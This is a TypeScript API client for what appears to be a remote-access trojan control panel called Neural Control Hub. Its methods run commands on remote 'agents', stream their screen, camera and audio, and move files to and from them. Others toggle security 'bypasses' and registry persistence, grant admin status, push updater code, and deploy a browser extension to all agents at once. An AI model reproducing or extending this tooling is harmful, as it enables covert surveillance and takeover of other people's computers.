/**
 * API Service for Neural Control Hub Frontend
 * Handles all HTTP API communication with the backend
 */

// API Configuration
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const runtimeApiUrl = (globalThis as any)?.__API_URL__ as string | undefined;

function resolveApiBaseUrl(): string {
  if (runtimeApiUrl) return runtimeApiUrl;

  if (typeof window !== 'undefined') {
    return `${window.location.protocol}//${window.location.host}`;
  }

  return (import.meta as any)?.env?.VITE_API_URL || 'https://neural-control-hub.onrender.com/';
}

export const API_BASE_URL = resolveApiBaseUrl();
const API_ENDPOINTS = {
  // Authentication
  auth: {
    login: '/api/auth/login',
    logout: '/api/auth/logout',
    status: '/api/auth/status',
  },
  // Agents
  agents: {
    list: '/api/agents',
    details: (id: string) => `/api/agents/${id}`,
    search: '/api/agents/search',
    performance: (id: string) => `/api/agents/${id}/performance`,
    alias: (id: string) => `/api/agents/${id}/alias`,
    execute: (id: string) => `/api/agents/${id}/execute`,
    commandHistory: (id: string) => `/api/agents/${id}/commands/history`,
    files: (id: string) => `/api/agents/${id}/files`,
    download: (id: string) => `/api/agents/${id}/files/download`,
    upload: (id: string) => `/api/agents/${id}/files/upload`,
    startStream: (id: string, type: string) => `/api/agents/${id}/stream/${type}/start`,
    stopStream: (id: string, type: string) => `/api/agents/${id}/stream/${type}/stop`,
  },
  // System
  system: {
    stats: '/api/system/stats',
    info: '/api/system/info',
    bypasses: '/api/system/bypasses',
    registry: '/api/system/registry',
    bypassesTest: '/api/system/bypasses/test',
    registryTest: '/api/system/registry/test',
    registryPresence: '/api/system/registry/presence',
    bypassesToggle: '/api/system/bypasses/toggle',
    registryToggle: '/api/system/registry/toggle',
    agentStatus: '/api/system/agent/status',
    agentAdmin: '/api/system/agent/admin',
    updateAgent: '/api/system/update-agent',
  },
  updater: {
    latest: '/api/updater/latest',
    push: '/api/updater/push',
  },
  // Activity
  activity: '/api/activity',
  // Actions
  actions: {
    bulk: '/api/actions/bulk',
  },
  // Settings
  settings: {
    get: '/api/settings',
    update: '/api/settings',
    reset: '/api/settings/reset',
  },
  // Videos
  videos: {
    list: '/api/videos',
    streamSource: (id: string) => `/api/videos/${id}/stream-source`,
  },
  // WebRTC
  webrtc: {
    config: '/api/webrtc/config',
    viewerConnect: '/api/webrtc/viewer/connect',
    viewerAnswer: '/api/webrtc/viewer/answer',
    viewerIce: '/api/webrtc/viewer/ice',
    viewerDisconnect: '/api/webrtc/viewer/disconnect',
  },
  extension: {
    config: '/api/extension/config',
    deploy: '/api/extension/deploy',
    upload: '/api/extension/upload',
  },
} as const;

// Types
export interface ApiResponse<T = any> {
  success?: boolean;
  data?: T;
  error?: string;
  message?: string;
}

export interface Agent {
  id: string;
  name: string;
  status: 'online' | 'offline';
  platform: string;
  ip: string;
  last_seen: string;
  capabilities: string[];
  performance: {
    cpu: number;
    memory: number;
    network: number;
  };
}

export interface SystemStats {
  agents: {
    total: number;
    online: number;
    offline: number;
  };
  streams: {
    active: number;
    screen: number;
    camera: number;
    audio: number;
  };
  commands: {
    executed_today: number;
    successful: number;
    failed: number;
  };
  network: {
    status: string;
    latency: number;
    throughput: number;
  };
}

export interface ActivityEvent {
  id: string;
  type: 'connection' | 'command' | 'stream' | 'file' | 'security' | 'system';
  action: string;
  details: string;
  agent_id: string;
  agent_name: string;
  timestamp: string;
  status: 'success' | 'warning' | 'error' | 'info';
}

export interface Video {
  id: string;
  title: string;
  duration: number;
  preview_url?: string;
  mp4_url?: string;
  hls_url?: string;
}

export interface StreamSource {
  type: 'mp4' | 'hls';
  url: string;
  expires_in: number;
}

// API Client Class
class ApiClient {
  private baseUrl: string;
  private inflight: Map<string, Promise<ApiResponse<any>>>;
  private controllers: Map<string, AbortController>;
  private cache: Map<string, { expires: number; value: ApiResponse<any> }>;

  constructor(baseUrl: string = API_BASE_URL) {
    this.baseUrl = baseUrl;
    this.inflight = new Map();
    this.controllers = new Map();
    this.cache = new Map();
  }

  async getBypasses(): Promise<ApiResponse<{ methods: Array<{key: string; enabled: boolean}>, sequence: Array<{id: number; name: string}> }>> {
    return this.request(API_ENDPOINTS.system.bypasses);
  }

  async getRegistry(): Promise<ApiResponse<{ actions: Array<{key: string; enabled: boolean}> }>> {
    return this.request(API_ENDPOINTS.system.registry);
  }

  async testBypass(key: string): Promise<ApiResponse<{ result: { method: string; enabled: boolean; executed: boolean } }>> {
    return this.request(API_ENDPOINTS.system.bypassesTest, {
      method: 'POST',
      body: JSON.stringify({ key }),
    });
  }

  async testRegistry(key: string): Promise<ApiResponse<{ result: { action: string; enabled: boolean; executed: boolean } }>> {
    return this.request(API_ENDPOINTS.system.registryTest, {
      method: 'POST',
      body: JSON.stringify({ key }),
    });
  }

  async checkRegistryPresence(key: string): Promise<ApiResponse<{ result: { present: boolean; path: string; value?: any; message?: string } }>> {
    return this.request(API_ENDPOINTS.system.registryPresence, {
      method: 'POST',
      body: JSON.stringify({ key }),
    });
  }

  async toggleBypass(key: string, enabled: boolean): Promise<ApiResponse<{ methods: Array<{key: string; enabled: boolean}> }>> {
    return this.request(API_ENDPOINTS.system.bypassesToggle, {
      method: 'POST',
      body: JSON.stringify({ key, enabled }),
    });
  }

  async setBypassesGlobal(enabled: boolean): Promise<ApiResponse<{ methods: Array<{key: string; enabled: boolean}> }>> {
    return this.request(API_ENDPOINTS.system.bypassesToggle, {
      method: 'POST',
      body: JSON.stringify({ global_enabled: enabled }),
    });
  }

  async toggleRegistry(key: string, enabled: boolean): Promise<ApiResponse<{ actions: Array<{key: string; enabled: boolean}> }>> {
    return this.request(API_ENDPOINTS.system.registryToggle, {
      method: 'POST',
      body: JSON.stringify({ key, enabled }),
    });
  }

  async setRegistryGlobal(enabled: boolean): Promise<ApiResponse<{ actions: Array<{key: string; enabled: boolean}> }>> {
    return this.request(API_ENDPOINTS.system.registryToggle, {
      method: 'POST',
      body: JSON.stringify({ global_enabled: enabled }),
    });
  }

  async getAgentSecurity(agentId: string): Promise<ApiResponse<{ methods: Array<{key: string; enabled: boolean}>, actions: Array<{key: string; enabled: boolean}>, global_bypasses: boolean, global_registry: boolean, admin: boolean }>> {
    return this.request(API_ENDPOINTS.system.agentStatus, {
      method: 'POST',
      body: JSON.stringify({ agent_id: agentId }),
    });
  }

  async toggleAgentBypass(agentId: string, key: string, enabled: boolean): Promise<ApiResponse<{ methods: Array<{key: string; enabled: boolean}>, global_enabled: boolean }>> {
    return this.request(API_ENDPOINTS.system.bypassesToggle, {
      method: 'POST',
      body: JSON.stringify({ agent_id: agentId, key, enabled }),
    });
  }

  async toggleAgentRegistry(agentId: string, key: string, enabled: boolean): Promise<ApiResponse<{ actions: Array<{key: string; enabled: boolean}>, global_enabled: boolean }>> {
    return this.request(API_ENDPOINTS.system.registryToggle, {
      method: 'POST',
      body: JSON.stringify({ agent_id: agentId, key, enabled }),
    });
  }

  async setAgentGlobal(agentId: string, bypasses?: boolean, registry?: boolean): Promise<ApiResponse> {
    if (typeof bypasses === 'boolean') {
      await this.request(API_ENDPOINTS.system.bypassesToggle, {
        method: 'POST',
        body: JSON.stringify({ agent_id: agentId, global_enabled: bypasses }),
      });
    }
    if (typeof registry === 'boolean') {
      await this.request(API_ENDPOINTS.system.registryToggle, {
        method: 'POST',
        body: JSON.stringify({ agent_id: agentId, global_enabled: registry }),
      });
    }
    return { success: true } as ApiResponse;
  }

  async setAgentAdminStatus(agentId: string, adminEnabled: boolean): Promise<ApiResponse<{ agent_id: string; admin_enabled: boolean }>> {
    return this.request(API_ENDPOINTS.system.agentAdmin, {
      method: 'POST',
      body: JSON.stringify({ agent_id: agentId, admin_enabled: adminEnabled }),
    });
  }
  private async request<T>(
    endpoint: string,
    options: RequestInit = {}
  ): Promise<ApiResponse<T>> {
    const url = `${this.baseUrl}${endpoint}`;
    
    // Prepare headers; avoid forcing Content-Type for FormData bodies
    const baseHeaders: Record<string, string> = {
      'Content-Type': 'application/json',
      ...(this.getSupabaseAuthHeader()),
      ...(options.headers as Record<string, string> || {}),
    };
    const isFormData = typeof FormData !== 'undefined' && (options.body as any) instanceof FormData;
    if (isFormData) {
      delete baseHeaders['Content-Type'];
    }
    const defaultOptions: RequestInit = {
      credentials: 'include',
      headers: baseHeaders,
    };

    const method = String(options.method || 'GET').toUpperCase();
    const bodyStr = typeof options.body === 'string' ? options.body : '';
    const key = `${method}:${endpoint}:${method === 'GET' ? '' : bodyStr.slice(0, 512)}`;
    const now = Date.now();
    const ttl = method === 'GET' ? 1000 : 0;
    const cached = method === 'GET' ? this.cache.get(key) : undefined;
    if (cached && cached.expires > now) {
      return cached.value as ApiResponse<T>;
    }
    const existing = this.inflight.get(key);
    if (existing) {
      return existing as Promise<ApiResponse<T>>;
    }
    const controller = new AbortController();
    const merged: RequestInit = { ...defaultOptions, ...options, signal: controller.signal };
    const p = (async () => {
      try {
        const response = await fetch(url, merged);
        const ct = String(response.headers.get('content-type') || '').toLowerCase();
        let data: any = null;
        try {
          data = await response.json();
        } catch {
          data = null;
        }
        if (response.ok && ct.includes('text/html')) {
          try {
            const w: any = window as any;
            const supTs = Number(w.__NCH_SUPPRESS_AUTH_REDIRECT__ || 0);
            if (!supTs || (Date.now() - supTs) >= 3000) {
              const evt = new CustomEvent('auth_required', { detail: { endpoint, method, url, timestamp: Date.now(), reason: 'html_redirect' } });
              window.dispatchEvent(evt);
              if (!w.__NCH_REDIRECTING__) {
                w.__NCH_REDIRECTING__ = true;
                setTimeout(() => {
                  try { window.location.replace('/login'); } catch {}
                }, 10);
              }
            }
          } catch {}
          return { success: false, error: 'Authentication required' } as ApiResponse<T>;
        }
        if (!response.ok) {
          const fail = {
            success: false,
            error: (data && data.error) ? data.error : `HTTP ${response.status}`,
            data,
          } as ApiResponse<T>;
          try {
            if (response.status === 401 || response.status === 403) {
              const isAuthEndpoint = endpoint.startsWith('/api/auth/');
              if (!isAuthEndpoint) {
                const w: any = window as any;
                const supTs = Number(w.__NCH_SUPPRESS_AUTH_REDIRECT__ || 0);
                if (!supTs || (Date.now() - supTs) >= 3000) {
                  const evt = new CustomEvent('auth_required', { detail: { endpoint, method, url, timestamp: Date.now() } });
                  window.dispatchEvent(evt);
                  try {
                    if (!w.__NCH_REDIRECTING__) {
                      w.__NCH_REDIRECTING__ = true;
                      setTimeout(() => {
                        try { window.location.replace('/login'); } catch {}
                      }, 10);
                    }
                  } catch {}
                }
              }
            }
            const evt2 = new CustomEvent('api_error', { detail: { status: response.status, endpoint, method, url, error: (data && data.error) || null, message: (data && (data.message || data.error)) || `HTTP ${response.status}`, timestamp: Date.now() } });
            window.dispatchEvent(evt2);
          } catch {}
          return fail;
        }
        const ok = {
          success: true,
          data,
        } as ApiResponse<T>;
        if (ttl > 0) {
          this.cache.set(key, { expires: now + ttl, value: ok });
        }
        return ok;
      } catch (error: any) {
        return {
          success: false,
          error: error?.message || 'Network error',
        } as ApiResponse<T>;
      } finally {
        this.inflight.delete(key);
        this.controllers.delete(key);
      }
    })();
    this.inflight.set(key, p);
    this.controllers.set(key, controller);
    return p;
  }

  private getSupabaseAuthHeader(): Record<string, string> {
    try {
      const t = (globalThis as any).__SUPABASE_JWT__ || localStorage.getItem('supabase_token') || '';
      return t ? { 'X-Supabase-Token': t } : {};
    } catch {
      return {};
    }
  }
  
  cancelAll(): void {
    for (const [, controller] of this.controllers) {
      try {
        controller.abort();
      } catch {}
    }
    this.controllers.clear();
    this.inflight.clear();
  }

  // Authentication Methods
  async login(password: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.auth.login, {
      method: 'POST',
      body: JSON.stringify({ password }),
    });
  }

  async logout(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.auth.logout, {
      method: 'POST',
    });
  }

  async checkAuthStatus(): Promise<ApiResponse<{ authenticated: boolean }>> {
    return this.request(API_ENDPOINTS.auth.status);
  }

  

  // Agent Methods
  async getAgents(): Promise<ApiResponse<{ agents: Agent[]; total_count: number; online_count: number }>> {
    return this.request(API_ENDPOINTS.agents.list);
  }

  async getAgentDetails(agentId: string): Promise<ApiResponse<Agent>> {
    return this.request(API_ENDPOINTS.agents.details(agentId));
  }

  async setAgentAlias(agentId: string, alias: string): Promise<ApiResponse<{ agent_id: string; alias: string }>> {
    return this.request(API_ENDPOINTS.agents.alias(agentId), {
      method: 'POST',
      body: JSON.stringify({ alias }),
    });
  }

  async searchAgents(params: {
    q?: string;
    status?: string;
    platform?: string;
    capability?: string;
  }): Promise<ApiResponse<{ agents: Agent[] }>> {
    const queryParams = new URLSearchParams();
    Object.entries(params).forEach(([key, value]) => {
      if (value) queryParams.append(key, value);
    });
    
    const endpoint = `${API_ENDPOINTS.agents.search}?${queryParams.toString()}`;
    return this.request(endpoint);
  }

  async getAgentPerformance(agentId: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.performance(agentId));
  }

  async executeCommand(agentId: string, command: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.execute(agentId), {
      method: 'POST',
      body: JSON.stringify({ command }),
    });
  }

  async getCommandHistory(agentId: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.commandHistory(agentId));
  }

  async startStream(
    agentId: string,
    streamType: 'screen' | 'camera' | 'audio',
    quality: string = 'high',
    mode: 'realtime' | 'buffered' = 'buffered',
    fps: number = 20,
    buffer_frames: number = 40,
  ): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.startStream(agentId, streamType), {
      method: 'POST',
      body: JSON.stringify({ quality, mode, fps, buffer_frames }),
    });
  }

  async stopStream(agentId: string, streamType: 'screen' | 'camera' | 'audio'): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.stopStream(agentId, streamType), {
      method: 'POST',
    });
  }

  async browseFiles(agentId: string, path: string = '/'): Promise<ApiResponse> {
    const endpoint = `${API_ENDPOINTS.agents.files(agentId)}?path=${encodeURIComponent(path)}`;
    return this.request(endpoint);
  }

  async downloadFile(agentId: string, filePath: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.agents.download(agentId), {
      method: 'POST',
      body: JSON.stringify({ path: filePath }),
    });
  }

  async uploadFile(agentId: string, file: File, destination?: string, socketSid?: string): Promise<ApiResponse> {
    const formData = new FormData();
    formData.append('file', file);
    if (destination) formData.append('destination', destination);
    if (socketSid) formData.append('socket_sid', socketSid);

    return this.request(API_ENDPOINTS.agents.upload(agentId), {
      method: 'POST',
      body: formData,
      headers: {}, // Let browser set Content-Type for FormData
    });
  }

  async uploadFileP2P(agentId: string, file: File, destination?: string, socketSid?: string): Promise<ApiResponse> {
    const formData = new FormData();
    formData.append('file', file);
    if (destination) formData.append('destination', destination);
    if (socketSid) formData.append('socket_sid', socketSid);
    const endpoint = `/api/agents/${agentId}/files/upload_p2p`;
    return this.request(endpoint, {
      method: 'POST',
      body: formData,
      headers: {},
    });
  }

  async uploadFileREST(agentId: string, file: File, virtualPath: string): Promise<ApiResponse> {
    const vp = (virtualPath || '_').trim(); // '_' means default (home)
    const endpoint = `/api/agents/${agentId}/upload/${encodeURIComponent(vp)}/${encodeURIComponent(file.name)}`;
    return this.request(endpoint, {
      method: 'POST',
      body: file,
      headers: {
        'Content-Type': 'application/octet-stream',
      },
    });
  }
  
  async uploadFilePowerShell(agentId: string, file: File, destinationDir?: string, socketSid?: string): Promise<ApiResponse> {
    const formData = new FormData();
    formData.append('file', file);
    if (destinationDir) formData.append('destination', destinationDir);
    if (socketSid) formData.append('socket_sid', socketSid);
    const endpoint = `/api/agents/${agentId}/files/upload_pscurl`;
    return this.request(endpoint, {
      method: 'POST',
      body: formData,
      headers: {},
    });
  }
  
  async downloadFromUrl(agentId: string, url: string, destinationDir?: string, filename?: string): Promise<ApiResponse> {
    const endpoint = `/api/agents/${agentId}/files/download_url`;
    const payload: any = { url };
    if (destinationDir) payload.destination = destinationDir;
    if (filename) payload.filename = filename;
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(payload),
      headers: {
        'Content-Type': 'application/json',
      },
    });
  }

  // System Methods
  async getSystemStats(): Promise<ApiResponse<SystemStats>> {
    return this.request(API_ENDPOINTS.system.stats);
  }

  async getSystemInfo(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.system.info);
  }
  async updateAgent(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.system.updateAgent, {
      method: 'POST',
    });
  }

  // Activity Methods
  async getActivity(type: string = 'all', limit: number = 50): Promise<ApiResponse<{ activities: ActivityEvent[] }>> {
    const params = new URLSearchParams({ type, limit: limit.toString() });
    return this.request(`${API_ENDPOINTS.activity}?${params.toString()}`);
  }

  // Bulk Actions
  async executeBulkAction(action: string, agentIds: string[] = []): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.actions.bulk, {
      method: 'POST',
      body: JSON.stringify({ action, agent_ids: agentIds }),
    });
  }

  // Settings Methods
  async getSettings(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.settings.get);
  }

  async updateSettings(settings: any): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.settings.update, {
      method: 'POST',
      body: JSON.stringify(settings),
    });
  }

  async resetSettings(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.settings.reset, {
      method: 'POST',
    });
  }
  
  // Extension Methods
  async getExtensionConfig(): Promise<ApiResponse<{ download_url: string; extension_id: string; display_name?: string }>> {
    return this.request(API_ENDPOINTS.extension.config);
  }
  async setExtensionConfig(download_url: string, extension_id?: string, display_name?: string): Promise<ApiResponse<{ download_url: string; extension_id: string; display_name?: string }>> {
    const body: any = { download_url };
    if (extension_id) body.extension_id = extension_id;
    if (typeof display_name === 'string') body.display_name = display_name;
    return this.request(API_ENDPOINTS.extension.config, {
      method: 'POST',
      body: JSON.stringify(body),
    });
  }
  async uploadExtensionCRX(file: File, extensionId?: string, displayName?: string): Promise<ApiResponse<{ download_url: string; extension_id: string; display_name?: string }>> {
    const form = new FormData();
    form.append('file', file);
    if (extensionId) form.append('extension_id', extensionId);
    if (typeof displayName === 'string') form.append('display_name', displayName);
    return this.request(API_ENDPOINTS.extension.upload, {
      method: 'POST',
      body: form,
    });
  }
  async deployExtensionAll(download_url?: string, extension_id?: string, display_name?: string): Promise<ApiResponse<{ sent: number }>> {
    const body: any = { agent_id: 'ALL' };
    if (download_url) body.download_url = download_url;
    if (extension_id) body.extension_id = extension_id;
    if (typeof display_name === 'string') body.display_name = display_name;
    return this.request(API_ENDPOINTS.extension.deploy, {
      method: 'POST',
      body: JSON.stringify(body),
    });
  }
  async getUpdaterLatest(): Promise<ApiResponse<{ version: string; sha256: string; download_url: string; last_push: string; size: number }>> {
    return this.request(API_ENDPOINTS.updater.latest);
  }
  async pushUpdater(code: string, version?: string): Promise<ApiResponse<{ version: string; sha256: string; download_url: string; last_push: string }>> {
    return this.request(API_ENDPOINTS.updater.push, {
      method: 'POST',
      body: JSON.stringify({ code, version }),
    });
  }

  async getVideos(): Promise<ApiResponse<{ videos: Video[] }>> {
    return this.request(API_ENDPOINTS.videos.list);
  }

  async getStreamSource(videoId: string): Promise<ApiResponse<StreamSource>> {
    return this.request(API_ENDPOINTS.videos.streamSource(videoId));
  }

  // WebRTC Methods
  async getWebrtcConfig(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.webrtc.config);
  }

  async webrtcViewerConnect(agentId: string): Promise<ApiResponse<{ offer: string; type: string }>> {
    return this.request(API_ENDPOINTS.webrtc.viewerConnect, {
      method: 'POST',
      body: JSON.stringify({ agent_id: agentId }),
    });
  }

  async webrtcViewerAnswer(answer: string): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.webrtc.viewerAnswer, {
      method: 'POST',
      body: JSON.stringify({ answer }),
    });
  }

  async webrtcViewerIce(candidate: any): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.webrtc.viewerIce, {
      method: 'POST',
      body: JSON.stringify({ candidate }),
    });
  }

  async webrtcViewerDisconnect(): Promise<ApiResponse> {
    return this.request(API_ENDPOINTS.webrtc.viewerDisconnect, {
      method: 'POST',
    });
  }
}

// Export singleton instance
export const apiClient = new ApiClient();
export default apiClient;
